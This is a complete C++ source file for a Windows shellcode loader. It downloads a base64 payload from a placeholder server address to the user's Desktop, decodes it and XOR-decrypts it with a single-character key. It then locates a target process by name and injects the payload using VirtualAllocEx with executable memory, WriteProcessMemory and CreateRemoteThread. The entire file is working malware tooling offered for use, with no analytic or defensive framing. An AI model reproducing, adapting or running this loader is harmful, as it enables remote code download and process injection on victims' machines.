#include "Windows.h"
#include <iostream>
#include <fstream>
#include <Urlmon.h>
#include <tlhelp32.h>
#include <AtlBase.h>
#include <atlconv.h>
#include <string>
#include <codecvt>
#include <locale>
#include <algorithm>

#pragma comment(lib, "urlmon.lib")

using namespace std;

size_t Base64Decode(const string& source, void* pdest, size_t dest_size);
DWORD FindProcessId(const std::wstring& processName);
string exec(string command);
wstring s2ws(const std::string& s);


int main(int argc, char* argv[]) {
    if (argv[1] == NULL) {
        cout << "This program works with 2 arguments please enter the process name." << endl;
    }
    else {
        //User Profile and obs_payload.txt Path
        string UserProfile = exec("echo %USERPROFILE%");
        UserProfile.erase(remove(UserProfile.begin(), UserProfile.end(), '\n'), UserProfile.end()); // remove '\n'
        string splitUserProfile = "\\Desktop\\obs_payload.txt";
        string TotalUserProfile = UserProfile + splitUserProfile;

        //Path converts to wstring first and then to lpcwstr
        wstring wUserProfile = s2ws(TotalUserProfile);
        LPCWSTR LpcUserProfile = wUserProfile.c_str();

        //Payload download
        LPCWSTR url = L"http://<ip>:<port>/obs_payload.txt";//Payload server.
        LPCWSTR destination = LpcUserProfile;
        HRESULT hr = URLDownloadToFileW(NULL, url, destination, 0, NULL);

        //Read payload and decode base64
        ifstream file(TotalUserProfile);
        string base64_string;
        getline(file, base64_string);

        unsigned char decoded_data[510] = { 0 };//Shell code byte size !!changable [510] value be carefully!!
        Base64Decode(base64_string, decoded_data, sizeof(decoded_data));

        //xor decrypt
        for (unsigned char& c : decoded_data) {
            c ^= 'b'; //key is b
        }

        //Get PID of Target Process

        string pidToStr(argv[1]);
        wstring wstrProcessName = wstring_convert<codecvt_utf8<wchar_t>>().from_bytes(pidToStr);
        DWORD processId = FindProcessId(wstrProcessName);

        //CreateRemoteThread Injection
        HANDLE processHandle;
        HANDLE remoteThread;
        PVOID remoteBuffer;

        processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
        remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof decoded_data, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

        WriteProcessMemory(processHandle, remoteBuffer, decoded_data, sizeof decoded_data, NULL);
        remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
        CloseHandle(processHandle);
    }
    return 0;
}

string exec(string command) {
    char buffer[128];
    string result = "";

    // Open pipe to file
    FILE* pipe = _popen(command.c_str(), "r");
    if (!pipe) {
        return "popen failed!";
    }

    // read till end of process:
    while (!feof(pipe)) {

        // use buffer to read and add to result
        if (fgets(buffer, 128, pipe) != NULL)
            result += buffer;
    }

    _pclose(pipe);
    return result;
}
wstring s2ws(const std::string& s) {
    int len;
    int slength = (int)s.length() + 1;
    len = MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, 0, 0);
    wchar_t* buf = new wchar_t[len];
    MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, buf, len);
    wstring r(buf);
    delete[] buf;
    return r;
}
struct BASE64_DEC_TABLE {
    signed char n[256];

    BASE64_DEC_TABLE() {
        for (int i = 0; i < 256; ++i)    n[i] = -1;
        for (unsigned char i = '0'; i <= '9'; ++i) n[i] = 52 + i - '0';
        for (unsigned char i = 'A'; i <= 'Z'; ++i) n[i] = i - 'A';
        for (unsigned char i = 'a'; i <= 'z'; ++i) n[i] = 26 + i - 'a';
        n['+'] = 62;
        n['/'] = 63;
    }
    int operator [] (unsigned char i) const { return n[i]; }
};

size_t Base64Decode(const string& source, void* pdest, size_t dest_size) {
    static const BASE64_DEC_TABLE b64table;
    if (!dest_size) return 0;
    const size_t len = source.length();
    int bc = 0, a = 0;
    char* const pstart = static_cast<char*>(pdest);
    char* pd = pstart;
    char* const pend = pd + dest_size;
    for (size_t i = 0; i < len; ++i) {
        const int n = b64table[source[i]];
        if (n == -1) continue;
        a |= (n & 63) << (18 - bc);
        if ((bc += 6) > 18) {
            *pd = a >> 16; if (++pd >= pend) return pd - pstart;
            *pd = a >> 8;  if (++pd >= pend) return pd - pstart;
            *pd = a;       if (++pd >= pend) return pd - pstart;
            bc = a = 0;
        }
    }
    if (bc >= 8) {
        *pd = a >> 16; if (++pd >= pend) return pd - pstart;
        if (bc >= 16) *(pd++) = a >> 8;
    }
    return pd - pstart;
}
DWORD FindProcessId(const std::wstring& processName) {
    PROCESSENTRY32 processInfo;
    processInfo.dwSize = sizeof(processInfo);

    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (processesSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    Process32First(processesSnapshot, &processInfo);
    if (!processName.compare(processInfo.szExeFile)) {
        CloseHandle(processesSnapshot);
        return processInfo.th32ProcessID;
    }

    while (Process32Next(processesSnapshot, &processInfo)) {
        if (!processName.compare(processInfo.szExeFile)) {
            CloseHandle(processesSnapshot);
            return processInfo.th32ProcessID;
        }
    }

    CloseHandle(processesSnapshot);
    return 0;
}
